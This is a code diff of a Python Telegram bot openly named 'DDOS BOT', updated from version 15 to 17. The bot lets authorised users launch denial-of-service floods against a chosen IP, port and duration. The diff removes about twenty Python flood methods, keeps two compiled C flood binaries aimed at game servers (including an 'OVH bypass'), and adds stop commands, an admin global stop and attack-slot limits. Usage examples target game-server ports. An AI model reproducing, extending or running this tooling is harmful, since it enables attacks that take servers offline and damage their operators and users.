@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 """
-💀 DDOS BOT v15.0 - C BINARIES ULTIMATE 💀
-All attacks use compiled C for maximum power
+💀 DDOS BOT v17.0 - C BINARIES + SLOTS 💀
 """
 
 import telebot
@@ -32,30 +31,8 @@ BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
 # ========== C BINARY ATTACKS ==========
 ATTACKS = {
-    # C Binaries
     'fivem_ovh': ('./fivem_ovh', 'FiveM OVH Bypass (C)'),
     'game_flood': ('./game_flood', 'Game Server Flood (C)'),
-    
-    # Python attacks (fallback)
-    'udp': ('python3 udp.py', 'UDP Flood'),
-    'tcp': ('python3 tcp.py', 'TCP Flood'),
-    'syn': ('python3 syn.py', 'SYN Flood'),
-    'httpflood': ('python3 httpflood.py', 'HTTP Flood'),
-    'tudp': ('python3 tudp.py', 'TUDP Monster'),
-    'mc': ('python3 mc.py', 'Minecraft Attack'),
-    'mcquery': ('python3 mcquery.py', 'Minecraft Query'),
-    'mchandshake': ('python3 mchandshake.py', 'Minecraft Handshake'),
-    'udpbypass': ('python3 udpbypass.py', 'UDP Bypass'),
-    'tcpbypass': ('python3 tcpbypass.py', 'TCP Bypass'),
-    'gudp': ('python3 gudp.py', 'GUDP Flood'),
-    '10gbps': ('python3 10gbps.py', '10 Gbps Attack'),
-    'maxpower': ('python3 maxpower.py', 'Max Power Attack'),
-    'udpbypass10g': ('python3 udpbypass10g.py', 'UDP Bypass 10G'),
-    'tcpbypass10g': ('python3 tcpbypass10g.py', 'TCP Bypass 10G'),
-    'killall': ('python3 killall.py', 'Killall Attack'),
-    'udppps': ('python3 udp-pps.py', 'UDP PPS Flood'),
-    'gre': ('python3 gre.py', 'GRE Protocol Attack'),
-    'multi': ('python3 multi_socket.py', 'Multi-Socket Attack'),
 }
 
 # ========== FUNCTIONS ==========
@@ -103,12 +80,9 @@ def execute_attack(user_id, attack_type, target, port, duration, extra=None):
     if not can_start:
         return False, msg
     
-    cmd_template, description = ATTACKS[attack_type]
-    
     try:
         attack_id = str(uuid.uuid4())[:8]
         
-        # Build command based on attack type
         if attack_type == 'fivem_ovh':
             threads = "2000"
             pps = "-1"
@@ -121,9 +95,7 @@ def execute_attack(user_id, attack_type, target, port, duration, extra=None):
             game = extra if extra else "fivem"
             cmd = ["./game_flood", target, str(port), src_port, src_ip, threads, pps, str(duration), game]
         else:
-            # Python scripts
-            script = cmd_template.replace("python3 ", "")
-            cmd = ["python3", script, target, str(port), str(duration)]
+            return False, f"Unknown attack type"
         
         process = subprocess.Popen(
             cmd,
@@ -196,39 +168,20 @@ def stop_user_attacks(user_id, attack_id=None):
 
 @bot.message_handler(commands=['start'])
 def start_command(message):
-    bot.reply_to(message, """💀 DDOS BOT v15.0 - C BINARIES ULTIMATE 💀
+    bot.reply_to(message, """💀 DDOS BOT v17.0 - C BINARIES + SLOTS 💀
 
-🔥 C BINARY ATTACKS (FASTEST):
+🔥 C BINARY ATTACKS:
 /fivem_ovh <target> <port> <time> - FiveM OVH Bypass (C)
 /game_flood <target> <port> <time> <game> - Game Flood (C)
-
-🔥 PYTHON ATTACKS:
-/udp <target> <port> <time> - UDP Flood
-/tcp <target> <port> <time> - TCP Flood
-/syn <target> <port> <time> - SYN Flood
-/httpflood <target> <port> <time> - HTTP Flood
-/tudp <target> <port> <time> - TUDP Monster
-/mc <target> <port> <time> - Minecraft Attack
-/mcquery <target> <port> <time> - Minecraft Query
-/mchandshake <target> <port> <time> - Minecraft Handshake
-/udpbypass <target> <port> <time> - UDP Bypass
-/tcpbypass <target> <port> <time> - TCP Bypass
-/gudp <target> <port> <time> - GUDP Flood
-/10gbps <target> <port> <time> - 10 Gbps Attack
-/maxpower <target> <port> <time> - Max Power Attack
-/udpbypass10g <target> <port> <time> - UDP Bypass 10G
-/tcpbypass10g <target> <port> <time> - TCP Bypass 10G
-/killall <target> <port> <time> - Killall Attack
-/udppps <target> <port> <time> - UDP PPS Flood
-/gre <target> <port> <time> - GRE Protocol Attack
-/multi <target> <port> <time> - Multi-Socket Attack
 
 📌 GAME OPTIONS: cs16, fivem, fivem2, gmod, csgo, ts3, amongus, source
 
 🛑 CONTROL:
 /stopall - Stop all attacks
+/stop <id> - Stop specific attack
 /status - Check attacks
 /slots - Check slots
+/id - Get your ID
 
 Example: /fivem_ovh 1.2.3.4 30120 60""")
 
@@ -236,33 +189,11 @@ Example: /fivem_ovh 1.2.3.4 30120 60""")
 def help_command(message):
     bot.reply_to(message, """💀 COMMANDS 💀
 
-C BINARIES:
 /fivem_ovh 1.2.3.4 30120 60
 /game_flood 1.2.3.4 27015 60 csgo
 
-PYTHON:
-/udp 1.2.3.4 80 60
-/tcp 1.2.3.4 80 60
-/syn 1.2.3.4 80 60
-/httpflood 1.2.3.4 80 60
-/tudp 1.2.3.4 80 60
-/mc 1.2.3.4 25565 60
-/mcquery 1.2.3.4 25565 60
-/mchandshake 1.2.3.4 25565 60
-/udpbypass 1.2.3.4 80 60
-/tcpbypass 1.2.3.4 80 60
-/gudp 1.2.3.4 80 60
-/10gbps 1.2.3.4 80 60
-/maxpower 1.2.3.4 80 60
-/udpbypass10g 1.2.3.4 80 60
-/tcpbypass10g 1.2.3.4 80 60
-/killall 1.2.3.4 80 60
-/udppps 1.2.3.4 80 60
-/gre 1.2.3.4 80 60
-/multi 1.2.3.4 80 60
-
-CONTROL:
 /stopall - Stop all attacks
+/stop <id> - Stop specific attack
 /status - Check attacks
 /slots - Check slots
 /id - Get your ID""")
@@ -297,9 +228,23 @@ def status_command(message):
             remaining = max(0, attack['duration'] - elapsed)
             msg += f"🆔 {attack['id']}\n"
             msg += f"📌 {attack['attack_type']} → {attack['target']}:{attack['port']}\n"
-            msg += f"⏱️ {remaining}s remaining\n\n"
+            msg += f"⏱️ {remaining}s remaining\n"
+            msg += f"🛑 /stop {attack['id']}\n\n"
         
         bot.reply_to(message, msg)
+
+@bot.message_handler(commands=['stop'])
+def stop_command(message):
+    user_id = str(message.chat.id)
+    parts = message.text.split()
+    
+    if len(parts) != 2:
+        bot.reply_to(message, "Usage: /stop <attack_id>")
+        return
+    
+    attack_id = parts[1]
+    count, msg = stop_user_attacks(user_id, attack_id)
+    bot.reply_to(message, msg)
 
 @bot.message_handler(commands=['stopall'])
 def stopall_command(message):
@@ -315,7 +260,8 @@ def admin_command(message):
     bot.reply_to(message, """👑 ADMIN:
 /add <userid> - Add user
 /remove <userid> - Remove user
-/allusers - List users""")
+/allusers - List users
+/globalstop - Stop ALL attacks""")
 
 @bot.message_handler(commands=['add'])
 def add_command(message):
@@ -371,6 +317,20 @@ def allusers_command(message):
             response += f"• ID: {uid}\n"
     bot.reply_to(message, response)
 
+@bot.message_handler(commands=['globalstop'])
+def globalstop_command(message):
+    if str(message.chat.id) not in ADMIN_IDS:
+        bot.reply_to(message, "❌ Admin only")
+        return
+    
+    total = 0
+    with lock:
+        for uid in list(running_attacks.keys()):
+            count, _ = stop_user_attacks(uid)
+            total += count
+    
+    bot.reply_to(message, f"✅ Stopped {total} global attacks")
+
 def make_handler(attack_type):
     def handler(message):
         user_id = str(message.chat.id)
@@ -402,15 +362,8 @@ def make_handler(attack_type):
             status_msg = bot.reply_to(message, f"⚡ Starting FiveM OVH (C) attack...")
             success, msg = execute_attack(user_id, attack_type, target, port, duration)
         else:
-            if len(parts) != 4:
-                bot.reply_to(message, f"Usage: /{attack_type} <target> <port> <time>")
-                return
-            target = parts[1]
-            port = int(parts[2])
-            duration = int(parts[3])
-            
-            status_msg = bot.reply_to(message, f"⚡ Starting {attack_type.upper()} attack...")
-            success, msg = execute_attack(user_id, attack_type, target, port, duration)
+            bot.reply_to(message, f"Unknown command")
+            return
         
         if success:
             bot.edit_message_text(f"✅ {msg}", chat_id=message.chat.id, message_id=status_msg.message_id)
@@ -419,16 +372,8 @@ def make_handler(attack_type):
     
     return handler
 
-# Register all attacks
-attacks = [
-    'fivem_ovh', 'game_flood',
-    'udp', 'tcp', 'syn', 'httpflood',
-    'tudp', 'mc', 'mcquery', 'mchandshake',
-    'udpbypass', 'tcpbypass', 'gudp',
-    '10gbps', 'maxpower', 'udpbypass10g', 'tcpbypass10g',
-    'killall', 'udppps', 'gre', 'multi'
-]
-
+# Register attacks
+attacks = ['fivem_ovh', 'game_flood']
 for attack in attacks:
     handler = make_handler(attack)
     handler.__name__ = f"handle_{attack}"
@@ -439,7 +384,7 @@ for attack in attacks:
 
 if __name__ == "__main__":
     print("=" * 60)
-    print("💀 DDOS BOT v15.0 - C BINARIES ULTIMATE 💀")
+    print("💀 DDOS BOT v17.0 - C BINARIES + SLOTS 💀")
     print("=" * 60)
     
     # Check C binaries
@@ -456,7 +401,8 @@ if __name__ == "__main__":
             save_user(admin)
     
     print(f"[+] Loaded {len(allowed_users)} users")
-    print(f"[+] Attack methods: {len(ATTACKS)}")
+    print(f"[+] Max slots per user: {MAX_SLOTS_PER_USER}")
+    print(f"[+] Max global slots: {MAX_GLOBAL_SLOTS}")
     print("=" * 60)
     print("[+] Bot running! Press Ctrl+C to stop.")
     bot.polling(none_stop=True)
